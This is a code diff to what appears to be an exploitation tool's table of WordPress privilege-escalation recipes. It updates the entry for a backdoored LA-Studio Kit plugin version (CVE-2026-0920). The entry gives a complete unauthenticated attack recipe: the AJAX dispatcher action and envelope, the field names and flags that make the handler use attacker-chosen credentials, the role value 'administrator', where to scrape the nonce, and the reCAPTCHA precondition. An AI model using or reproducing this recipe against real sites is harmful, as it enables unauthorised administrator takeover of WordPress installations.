@@ -253,16 +253,52 @@ PRIVESC_RECIPES = [
         "affected": "<=1.5.6.3",
         "kind": "register-role",
         "endpoint": "/wp-admin/admin-ajax.php",
-        # ajax_register_handle is hooked to a nopriv AJAX action; the exact
-        # action string should be confirmed against the plugin source / PoC.
-        "action": "lastudio_register",
-        "user_field": "user_login",
+        # LA-Studio batches all its front-end AJAX through ONE dispatcher action
+        # (wp_ajax_nopriv_lakit_ajax in includes/modules/ajax/manager.php,
+        # class LaStudio_Kit_Ajax_Manager::handle_ajax_request). The real
+        # per-feature action name ("register" -> ajax_register_handle) is
+        # nested inside a JSON-encoded `actions` param, not passed as the
+        # top-level `action` value -- see `envelope` below.
+        "action": "lakit_ajax",
+        "envelope": {"subaction": "register", "id": "0"},
+        "user_field": "username",
         "email_field": "email",
         "pass_field": "password",
+        "pass_confirm_field": "password-confirm",
+        # ajax_register_handle only *validates/uses* username+password when
+        # these flags are "yes" -- omit them and the handler silently
+        # generates its own username/password instead of using ours.
+        "extra_params": {"lakit_field_log": "yes", "lakit_field_pwd": "yes",
+                          "lakit_field_cpwd": "yes"},
         "role_param": "lakit_bkrole",
         "role_value": "administrator",
+        # register_ajax_action('register', ..., $protected=true) requires a
+        # valid nonce for action LaStudio_Kit_Ajax_Manager::NONCE_KEY
+        # ('lakit_ajax'), localized as LaStudioKitSettings.ajaxNonce on any
+        # front-end page loading the plugin's base script (no specific widget
+        # placement needed, unlike King Addons CVE-2025-6325).
+        "nonce_from": {"url": "/", "key": "ajaxNonce",
+                       "object": "LaStudioKitSettings", "param": "_nonce"},
         "source": "registry",
-        "note": "ajax_register_handle honours lakit_bkrole → unauth admin registration.",
+        "note": "Unauth privesc-to-admin (CVE-2026-0920): a former LA-Studio "
+                "employee planted a backdoor in ajax_register_handle() that "
+                "honors an attacker-supplied lakit_bkrole registration field "
+                "with no allowlist, landing straight in wp_insert_user() as "
+                "that role. Reported via the Wordfence Bug Bounty Program "
+                "2026-01-12, patched in 1.6.0 (2026-01-14) which no longer "
+                "reads lakit_bkrole at all. CAVEAT: the malicious 1.5.6.3 tag "
+                "was pulled from the public wp.org SVN after disclosure, so "
+                "the literal backdoor line can't be independently re-read "
+                "from source the way King Addons/Opal Estate could -- this "
+                "recipe's request shape (dispatcher envelope, field names, "
+                "nonce location) IS source-confirmed from the surviving "
+                "ajax_register_handle()/ajax manager code shared with 1.6.0; "
+                "the lakit_bkrole name/behavior itself rests on cross-"
+                "corroborating wpscan, the public GitHub PoC "
+                "(John-doe-code-a11/CVE-2026-0920), and vendor writeups, not "
+                "a first-party source read. Also requires reCAPTCHA v3 to be "
+                "unconfigured (the default -- verify_recaptchav3() "
+                "short-circuits true when no site/secret key is set).",
     },
     {
         "plugin": "kirki",
